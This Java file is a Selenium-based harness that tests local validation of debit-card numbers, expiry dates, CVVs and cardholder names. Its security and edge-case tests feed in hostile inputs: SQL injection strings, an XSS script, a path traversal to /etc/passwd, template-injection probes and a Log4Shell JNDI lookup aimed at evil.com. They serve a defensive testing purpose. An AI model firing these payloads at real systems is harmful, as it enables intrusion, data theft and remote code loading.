package Debit;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.support.ui.WebDriverWait;
import org.openqa.selenium.support.ui.ExpectedConditions;
import java.time.Duration;
import java.util.*;
import java.util.regex.Pattern;

public class Debit {
    
    private static WebDriver driver;
    private static WebDriverWait wait;
    private static int passCount = 0;
    private static int failCount = 0;
    
    public static void main(String[] args) {
        setup();
        
        try {
            System.out.println("=== ADVANCED DEBIT CARD VALIDATION TESTING ===\n");
            
            // Navigate to a demo site
            driver.get("https://httpbin.org/html");
            Thread.sleep(2000);
            
            runCardNumberTests();
            runExpiryDateTests();
            runCVVTests();
            runCardHolderNameTests();
            runCombinationTests();
            runEdgeCaseTests();
            runSecurityTests();
            
            printFinalResults();
            
        } catch (Exception e) {
            System.out.println("Error during testing: " + e.getMessage());
        } finally {
            tearDown();
        }
    }
    
    private static void setup() {
        driver = new FirefoxDriver();
        wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        driver.manage().window().maximize();
    }
    
    private static void runCardNumberTests() {
        System.out.println("1. CARD NUMBER VALIDATION TESTS");
        System.out.println("================================");
        
        // Valid card numbers for different providers
        String[] validCards = {
            "4532015112830366", // Visa
            "4000056655665556", // Visa Debit
            "5555555555554444", // Mastercard
            "5200828282828210", // Mastercard Debit
            "378282246310005",  // American Express
            "6011111111111117", // Discover
            "3056930009020004", // Diners Club
            "5019717010103742", // Dankort
            "6331101999990016"  // Switch/Solo
        };
        
        String[] invalidCards = {
            "4532015112830367", // Invalid Luhn
            "1234567890123456", // Invalid pattern
            "4532",             // Too short
            "45320151128303661234", // Too long
            "4532-0151-1283-0366", // Invalid format
            "abcd1234efgh5678",     // Contains letters
            "",                     // Empty
            "0000000000000000",     // All zeros
            "1111111111111111",     // All ones
            "9999999999999999"      // Invalid Luhn with 9s
        };
        
        System.out.println("Testing VALID card numbers:");
        for (String card : validCards) {
            testCardNumber(card, true, getCardType(card));
        }
        
        System.out.println("\nTesting INVALID card numbers:");
        for (String card : invalidCards) {
            testCardNumber(card, false, "Invalid");
        }
        
        System.out.println();
    }
    
    private static void runExpiryDateTests() {
        System.out.println("2. EXPIRY DATE VALIDATION TESTS");
        System.out.println("===============================");
        
        String[] validExpiry = {
            "12/25", "01/26", "06/30", "12/99", "03/24"
        };
        
        String[] invalidExpiry = {
            "13/25",   // Invalid month
            "00/25",   // Invalid month
            "12/23",   // Past year
            "01/20",   // Past date
            "1/25",    // Single digit month
            "12/5",    // Single digit year
            "25/12",   // Wrong format
            "12-25",   // Wrong separator
            "12/2025", // 4-digit year
            "",        // Empty
            "ab/cd",   // Letters
            "32/25",   // Invalid day instead of month
            "12/",     // Missing year
            "/25"      // Missing month
        };
        
        System.out.println("Testing VALID expiry dates:");
        for (String expiry : validExpiry) {
            testExpiryDate(expiry, true);
        }
        
        System.out.println("\nTesting INVALID expiry dates:");
        for (String expiry : invalidExpiry) {
            testExpiryDate(expiry, false);
        }
        
        System.out.println();
    }
    
    private static void runCVVTests() {
        System.out.println("3. CVV VALIDATION TESTS");
        System.out.println("=======================");
        
        String[] validCVV = {
            "123", "000", "999", "4567", "0001"
        };
        
        String[] invalidCVV = {
            "12",     // Too short
            "12345",  // Too long
            "abc",    // Letters
            "12a",    // Mixed
            "",       // Empty
            "1 23",   // Space
            "12.3",   // Decimal
            "-123"    // Negative
        };
        
        System.out.println("Testing VALID CVV codes:");
        for (String cvv : validCVV) {
            testCVV(cvv, true);
        }
        
        System.out.println("\nTesting INVALID CVV codes:");
        for (String cvv : invalidCVV) {
            testCVV(cvv, false);
        }
        
        System.out.println();
    }
    
    private static void runCardHolderNameTests() {
        System.out.println("4. CARDHOLDER NAME VALIDATION TESTS");
        System.out.println("===================================");
        
        String[] validNames = {
            "John Doe",
            "MARY JANE SMITH",
            "jose maria gonzalez",
            "O'Connor",
            "Van Der Berg",
            "Jean-Pierre Dupont",
            "Li Wei",
            "Muhammad bin Abdullah"
        };
        
        String[] invalidNames = {
            "",           // Empty
            "J",          // Too short
            "John123",    // Contains numbers
            "John@Doe",   // Special characters
            "   ",        // Only spaces
            "John  Doe",  // Multiple spaces
            generateLongString("A", 100), // Too long
            "John_Doe"    // Underscore
        };
        
        System.out.println("Testing VALID cardholder names:");
        for (String name : validNames) {
            testCardHolderName(name, true);
        }
        
        System.out.println("\nTesting INVALID cardholder names:");
        for (String name : invalidNames) {
            testCardHolderName(name, false);
        }
        
        System.out.println();
    }
    
    private static void runCombinationTests() {
        System.out.println("5. COMBINATION VALIDATION TESTS");
        System.out.println("===============================");
        
        // Test combinations of valid and invalid data
        Object[][] combinations = {
            {"4532015112830366", "12/25", "123", "John Doe", true, "All valid"},
            {"4532015112830367", "12/25", "123", "John Doe", false, "Invalid card"},
            {"4532015112830366", "13/25", "123", "John Doe", false, "Invalid expiry"},
            {"4532015112830366", "12/25", "12", "John Doe", false, "Invalid CVV"},
            {"4532015112830366", "12/25", "123", "", false, "Empty name"},
            {"", "", "", "", false, "All empty"},
            {"5555555555554444", "01/26", "4567", "MARY SMITH", true, "Mastercard valid"},
            {"378282246310005", "06/30", "1234", "Jose Maria", true, "Amex valid"}
        };
        
        for (Object[] combo : combinations) {
            testCombination(
                (String)combo[0], // card
                (String)combo[1], // expiry
                (String)combo[2], // cvv
                (String)combo[3], // name
                (Boolean)combo[4], // expected
                (String)combo[5]   // description
            );
        }
        
        System.out.println();
    }
    
    private static void runEdgeCaseTests() {
        System.out.println("6. EDGE CASE TESTS");
        System.out.println("==================");
        
        // Test various edge cases
        testCardNumber("4532 0151 1283 0366", true, "Visa with spaces");
        testCardNumber("4532-0151-1283-0366", false, "Visa with dashes");
        testExpiryDate("12/24", getCurrentYear() <= 24);
        testCVV("000", true);
        testCardHolderName("A B", true);
        testCardHolderName("X Æ A-XII", false);
        
        // Test SQL injection attempts
        testCardHolderName("'; DROP TABLE users; --", false);
        testCardNumber("4532'; DROP TABLE cards; --0366", false, "SQL in card number");
        
        System.out.println();
    }
    
    private static void runSecurityTests() {
        System.out.println("7. SECURITY VALIDATION TESTS");
        System.out.println("============================");
        
        // Test potential security issues
        String[] securityTests = {
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "../../../etc/passwd",
            "admin'--",
            "1' OR '1'='1",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "<%=7*7%>"
        };
        
        System.out.println("Testing security payloads in name field:");
        for (String payload : securityTests) {
            testCardHolderName(payload, false);
        }
        
        System.out.println();
    }
    
    private static void testCardNumber(String cardNumber, boolean expected, String type) {
        boolean result = isValidCardNumber(cardNumber);
        String status = (result == expected) ? "PASS" : "FAIL";
        
        if (result == expected) passCount++; else failCount++;
        
        System.out.printf("%-20s | %-8s | %s | %s%n", 
            cardNumber.length() > 20 ? cardNumber.substring(0, 17) + "..." : cardNumber,
            type, status, result == expected ? "✓" : "✗");
    }
    
    private static void testExpiryDate(String expiry, boolean expected) {
        boolean result = isValidExpiry(expiry);
        String status = (result == expected) ? "PASS" : "FAIL";
        
        if (result == expected) passCount++; else failCount++;
        
        System.out.printf("%-10s | %s | %s%n", expiry, status, result == expected ? "✓" : "✗");
    }
    
    private static void testCVV(String cvv, boolean expected) {
        boolean result = isValidCVV(cvv);
        String status = (result == expected) ? "PASS" : "FAIL";
        
        if (result == expected) passCount++; else failCount++;
        
        System.out.printf("%-8s | %s | %s%n", cvv, status, result == expected ? "✓" : "✗");
    }
    
    private static void testCardHolderName(String name, boolean expected) {
        boolean result = isValidCardHolderName(name);
        String status = (result == expected) ? "PASS" : "FAIL";
        
        if (result == expected) passCount++; else failCount++;
        
        String displayName = name.length() > 25 ? name.substring(0, 22) + "..." : name;
        System.out.printf("%-25s | %s | %s%n", displayName, status, result == expected ? "✓" : "✗");
    }
    
    private static void testCombination(String card, String expiry, String cvv, String name, boolean expected, String desc) {
        boolean cardValid = isValidCardNumber(card);
        boolean expiryValid = isValidExpiry(expiry);
        boolean cvvValid = isValidCVV(cvv);
        boolean nameValid = isValidCardHolderName(name);
        
        boolean result = cardValid && expiryValid && cvvValid && nameValid;
        String status = (result == expected) ? "PASS" : "FAIL";
        
        if (result == expected) passCount++; else failCount++;
        
        System.out.printf("%-20s | %s | %s%n", desc, status, result == expected ? "✓" : "✗");
    }
    
    // Enhanced validation methods
    private static boolean isValidCardNumber(String cardNumber) {
        if (cardNumber == null || cardNumber.trim().isEmpty()) return false;
        
        // Remove spaces and check for invalid characters
        cardNumber = cardNumber.replaceAll("\\s", "");
        if (!cardNumber.matches("\\d+")) return false;
        
        if (cardNumber.length() < 13 || cardNumber.length() > 19) return false;
        
        // Luhn algorithm
        int sum = 0;
        boolean alternate = false;
        
        for (int i = cardNumber.length() - 1; i >= 0; i--) {
            int digit = Character.getNumericValue(cardNumber.charAt(i));
            
            if (alternate) {
                digit *= 2;
                if (digit > 9) {
                    digit = (digit % 10) + 1;
                }
            }
            
            sum += digit;
            alternate = !alternate;
        }
        
        return (sum % 10 == 0);
    }
    
    private static boolean isValidExpiry(String expiry) {
        if (expiry == null || !expiry.matches("\\d{2}/\\d{2}")) return false;
        
        String[] parts = expiry.split("/");
        int month = Integer.parseInt(parts[0]);
        int year = Integer.parseInt(parts[1]) + 2000;
        
        if (month < 1 || month > 12) return false;
        
        Calendar now = Calendar.getInstance();
        int currentYear = now.get(Calendar.YEAR);
        int currentMonth = now.get(Calendar.MONTH) + 1;
        
        return year > currentYear || (year == currentYear && month >= currentMonth);
    }
    
    private static boolean isValidCVV(String cvv) {
        return cvv != null && cvv.matches("\\d{3,4}");
    }
    
    private static boolean isValidCardHolderName(String name) {
        if (name == null || name.trim().isEmpty()) return false;
        if (name.length() < 2 || name.length() > 50) return false;
        
        // Allow letters, spaces, hyphens, apostrophes
        Pattern validPattern = Pattern.compile("^[a-zA-Z\\s'-]+$");
        if (!validPattern.matcher(name).matches()) return false;
        
        // Check for multiple consecutive spaces
        if (name.contains("  ")) return false;
        
        return true;
    }
    
    // Helper method for Java 8 compatibility
    private static String generateLongString(String character, int length) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append(character);
        }
        return sb.toString();
    }
    
    private static String getCardType(String cardNumber) {
        cardNumber = cardNumber.replaceAll("\\s", "");
        
        if (cardNumber.startsWith("4")) return "Visa";
        if (cardNumber.startsWith("5") || cardNumber.startsWith("2")) return "Mastercard";
        if (cardNumber.startsWith("34") || cardNumber.startsWith("37")) return "Amex";
        if (cardNumber.startsWith("6011") || cardNumber.startsWith("65")) return "Discover";
        if (cardNumber.startsWith("30") || cardNumber.startsWith("38")) return "Diners";
        
        return "Unknown";
    }
    
    private static int getCurrentYear() {
        return Calendar.getInstance().get(Calendar.YEAR) % 100;
    }
    
    private static void printFinalResults() {
        System.out.println("========================================");
        System.out.println("FINAL TEST RESULTS");
        System.out.println("========================================");
        System.out.println("Total Tests: " + (passCount + failCount));
        System.out.println("Passed: " + passCount + " ✓");
        System.out.println("Failed: " + failCount + " ✗");
        System.out.println("Success Rate: " + String.format("%.1f", (passCount * 100.0 / (passCount + failCount))) + "%");
        System.out.println("========================================");
    }
    
    private static void tearDown() {
        if (driver != null) {
            driver.quit();
        }
    }
}